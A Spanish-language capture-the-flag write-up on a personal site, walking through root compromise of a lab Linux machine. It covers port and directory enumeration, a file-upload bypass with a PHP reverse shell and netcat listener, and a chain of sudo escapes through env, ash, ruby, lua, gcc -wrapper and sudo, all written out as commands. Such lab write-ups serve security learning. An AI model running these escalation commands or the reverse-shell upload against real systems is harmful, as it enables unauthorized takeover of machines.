<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Library</title>
  <link href="../style/estilo.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
  <script>hljs.highlightAll();</script>
</head>

<body class="bg-gray-900 text-white">

    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div class="flex justify-between items-center h-16">
            <div class="flex-shrink-0">
            <h1>Santiago Lorenzo</h1>
            </div>
            <div class="hidden md:flex space-x-4">
            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
            </div>
        </div>
        </div>
    </nav>

    <main class="max-w-4xl mx-auto px-6 py-12">

    <h1 class="text-4xl font-bold mb-2">üîπMaquina: elevator</h1>
    <p class="text-gray-400 text-sm mb-8">üìÖ Publicado el 15/12/2025 | Categor√≠a: LINUX </p>

    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üìù Descripci√≥n</h2>
        <p class="text-gray-300 leading-relaxed">
            Este reto consiste en comprometer una m√°quina Linux en un entorno controlado. No se proporciona una flag directa,
            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
        </p>
    </section>

    <!----------------- An√°lisis ----------------------->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üîç An√°lisis inicial</h2>
        <p class="text-gray-300 mb-4">
            El an√°lisis comenz√≥ con un reconocimiento b√°sico utilizando herramientas de enumeraci√≥n para comprender los servicios expuestos.
            Una vez dentro del sistema como usuario limitado, buscamos posibles vectores de escalada de privilegios.
        </p>
        <pre><code class="language-bash">
            sudo nmap -p- -open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2

            PORT   STATE SERVICE VERSION
            80/tcp open  http    Apache httpd 2.4.62 ((Debian))
            |_http-server-header: Apache/2.4.62 (Debian)
            |_http-title: El Ascensor Embrujado - Un Misterio de Scooby-Doo
        </code></pre>

        <p class="text-gray-300 mt-4">
            en el http hacemos descubrimiento con gobuster
        </p>

        <pre><code class="language-bash">
            gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

                /themes               (Status: 301) [Size: 309] [--> http://172.17.0.2/themes/]
                /javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
                /Template             (Status: 403) [Size: 275]
                /Repository           (Status: 403) [Size: 275]
                /Tag                  (Status: 403) [Size: 275]
                /server-status        (Status: 403) [Size: 275]

            ‚ùØ gobuster dir -u http://172.17.0.2/themes -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 32 -x php,html,txt,zip

                /uploads              (Status: 301) [Size: 317] [--> http://172.17.0.2/themes/uploads/]
                /upload.php           (Status: 200) [Size: 0]
                /archivo.html         (Status: 200) [Size: 3380]
        </code></pre>

        <img src="../Assets/elevator/1-archivo.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">

    <section class="mb-8">
        <p class="text-gray-300 mb-4">
            Ahora para hacer el bypass, creamos un archivo con la extension .php.jpg 
            en el cual tiene una rever shell de php pentestmonkey, mientras nos ponemos a la escucha con:
        </p>

        <pre><code class="language-bash">
            nc -lvnp 4444
        </code></pre>


        <p class="text-gray-300 mt-4">
            y nos devuelve una shell como www-data
        </p>

        <img src="../Assets/elevator/2-rev-shell.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">

        <p class="text-gray-300 mt-4">
            Ahora comenzamos la escalada de privilegios
            www-data ‚Üí daphne:
        </p>

        <pre><code class="language-bash">
        sudo -l
            (daphne) NOPASSWD: /usr/bin/env
        </code></pre>

        <p class="text-gray-300 mt-4">
            Explotaci√≥n:
        </p>
        <pre><code class="language-bash">
            sudo -u daphne /usr/bin/env /bin/bash
        </code></pre>
        
        <p class="text-gray-300 mt-4">
            env permite ejecutar binarios arbitrarios.
            daphne ‚Üí vilma:
        </p>
        
        <pre><code class="language-bash">
        sudo -l
            (vilma) NOPASSWD: /usr/bin/ash
        </code></pre>

        <p class="text-gray-300 mt-4">
            Explotaci√≥n:
        </p>
        <pre><code class="language-bash">
            sudo -u vilma /usr/bin/ash
        </code></pre>

        <p class="text-gray-300 mt-4">
            ash es una shell ‚Üí escalada directa.
            vilma ‚Üí shaggy:
        </p>
        
        <pre><code class="language-bash">
        sudo -l
            (shaggy) NOPASSWD: /usr/bin/ruby
        </code></pre>

        <p class="text-gray-300 mt-4">
            Explotaci√≥n:
        </p>

        <pre><code class="language-bash">
            sudo -u shaggy /usr/bin/ruby -e 'exec "/bin/sh"'
        </code></pre>
        <p class="text-gray-300 mt-4">
            Ruby ejecuta c√≥digo arbitrario.
            shaggy ‚Üí fred:
        </p>
        <pre><code class="language-bash">
        sudo -l
            (fred) NOPASSWD: /usr/bin/lua
        </code></pre>

        <p class="text-gray-300 mt-4">
            Explotaci√≥n:
        </p>

        <pre><code class="language-bash">
            sudo -u fred /usr/bin/lua -e 'os.execute("/bin/sh")'
        </code></pre>
        <p class="text-gray-300 mt-4">
            Lua permite ejecutar comandos del sistema.
            fred ‚Üí scooby:
        </p>
        <pre><code class="language-bash">
        sudo -l
            (scooby) NOPASSWD: /usr/bin/gcc
        </code></pre>

        <p class="text-gray-300 mt-4">
            No se puede ejecutar binarios compilados directamente (no est√°n en sudoers).
            Explotaci√≥n correcta usando GTFOBins (gcc -wrapper).
            Explotaci√≥n:
        </p>

        <pre><code class="language-bash">
            sudo -u scooby /usr/bin/gcc -wrapper /bin/sh,-s -x c /dev/null
        </code></pre>
        <p class="text-gray-300 mt-4">
            -wrapper ejecuta un shell dentro del proceso de gcc.
        </p>
        </section>

    <!-- Explotaci√≥n / Resoluci√≥n -->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üí£ Explotaci√≥n / Resoluci√≥n de scooby ‚Üí root</h2>

        <pre><code class="language-bash">
        sudo -l
            (root) NOPASSWD: /usr/bin/sudo
        </code></pre>

        <pre><code class="language-bash">
            sudo -u root /usr/bin/sudo /bin/bash

            # Resultado: spawnea una shell como root
            whoami
            root
        </code></pre>

        <p class="text-gray-300 mt-4">
            Gracias a esto obtuvimos acceso directo como usuario <code>root</code>.
        </p>
    </section>

    <!-- Resultado final -->
    <section class="mb-8">
        <h2 class="text-2xl font-semibold mb-2">üèÜ Resultado</h2>
        <p class="text-gray-300">
            Conseguimos acceso como <code>root</code>, pero no encontramos una flag en la m√°quina. 
            Aun as√≠, el objetivo principal de escalada de privilegios fue completado con √©xito.
        </p>
    </section>

    <div class="mt-10">
        <a href="../writeup.html"
            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
            ‚Üê Volver a la lista de Write-ups
        </a>
    </div>

    </main>

</body>
</html>
